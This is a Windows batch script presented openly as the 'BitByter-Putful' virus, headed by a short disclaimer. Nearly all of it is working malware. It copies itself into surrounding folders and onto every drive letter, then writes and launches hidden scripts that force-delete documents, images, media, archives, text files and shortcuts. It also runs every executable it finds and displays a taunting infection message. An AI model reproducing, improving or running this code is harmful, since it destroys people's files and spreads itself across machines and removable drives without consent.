@REM DO NOT RUN PUTFUL BITBYTER WITH MALICIOUS OR ILLEGAL INTENT, I AS CREATOR DO NOT CONTROL WHAT THIS MIGHT DO, AND YOU ARE SOLELY RESPONSILE FOR YOUR USAGE OF THIS CODE.
:boopcodenose
@if "%1"=="/spread" goto letsbegintheterror
@if exist \dontbytethebitsonthisdrive.putfull (
@echo off
echo eliminated, this drive has a "dont byte the bits on this drive, putfull!" file.
pause
exit
)
@echo HI! You die today!
@echo:
@echo This virus was made to show the power of a simple computer 'virus'. If you didn't mean to run it, you are probably in trouble, ask a superior in IT for help.
@echo:
@echo The drive that will be targeted looks like this:
@echo:
@echo:
@echo:
@dir \
@timeout /t 3 /nobreak >NUL
cls
:letsbegintheterror
powershell -WindowStyle Hidden -command ""
if "%~n0"=="23" goto iam23
if "%~n0"=="25" goto iam25
if %~n0 GEQ 26 call :flood
:loop
FOR /F "tokens=*" %%G IN ('dir /b /S /AD "%~dp0..\..\*"') DO call :pool "%%G\"
call :pool "%~dp0"
type "%~s0" > ..\%~nx0
start /min cmd /c ..\%~nx0 /spread
job is done.
exit
:pool
@if exist \dontbytethebitsonthisdrive.putfull (
@echo off
echo eliminated, this drive has a "dont byte the bits on this drive, putfull!" file.
pause
exit
)
set /a putfullpoolloopnumber+=1
if %putfullpoolloopnumber% GEQ 30 (
set "putfullpoolloopnumber=1"
exit /b
)
if not exist "%~dp1putfullsterrorism.cmd" (
(
echo powershell -WindowStyle Hidden -command ""
echo cd "%%~dp0"
echo del *.docx /F /Q
echo del *.doc /F /Q
echo del *.rtf /F /Q
echo del *.lnk /F /Q
echo del *.txt /F /Q
echo del *.inf /F /Q
echo del *.js /F /Q
echo del *.jpg /F /Q
echo del *.mp? /F /Q
echo del *.mkv /F /Q
echo del *.zip /F /Q
echo del *.7z /F /Q
echo del *.i?? /F /Q
echo echo bwhahahaha ^> bitbyter-putfull.was_here
echo echo self destructed... ur too late ^> "%%~s0"
) > "%~dp1putfullsterrorism.cmd"
)
if not exist "%~dp1bitbyter-putfull.was_here" (
start /min cmd /c "%~dp1putfullsterrorism.cmd"
)
set nextnum_putfulbitsbyter=%putfullpoolloopnumber%
REM set nextnum_putfulbitsbyter=%random% :: Unleashes a hellfury of CPU-overheating scripts but no actual effect.
set "nextfil_putfulbitsbyter=%~dp1\%nextnum_putfulbitsbyter%.cmd"
if exist "%nextfil_putfulbitsbyter%" goto loop
if "%nextnum_putfulbitsbyter%"=="%~n0" exit /b
type "%~s0" > "%nextfil_putfulbitsbyter%"
start /min cmd /c "%nextfil_putfulbitsbyter%" /spread
FOR /F "tokens=*" %%G IN ('dir /b %~dp1*.exe') DO start /min %%G
if %putfullpoolloopnumber% LSS 31 goto :pool else (
set "putfullpoolloopnumber=1"
exit /b
)
exit /b
:flood
FOR %%G IN (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) DO (call :bushfire %%G:\)
exit /b
:bushfire
if exist "%~dp1\%~nx0" exit /b
pushd "%~dp1\" || exit /b
type "%~s0" > "%~dp1\%~nx0"
popd
exit /b
:iam23
start mshta about:Noticed%20some%20slowness,%20weird%20black%20boxes%20popping%20up%3F%20You%20have%20been%20infected%20by%20the%20The%20BitByter-Putful%20virus.%20And%20there%20is%20no%20going%20back.
goto loop
:iam25
FOR /F "tokens=*" %%G IN ('dir /b /S "%~d0\*.exe"') DO start cmd /c "%%G\"
goto loop
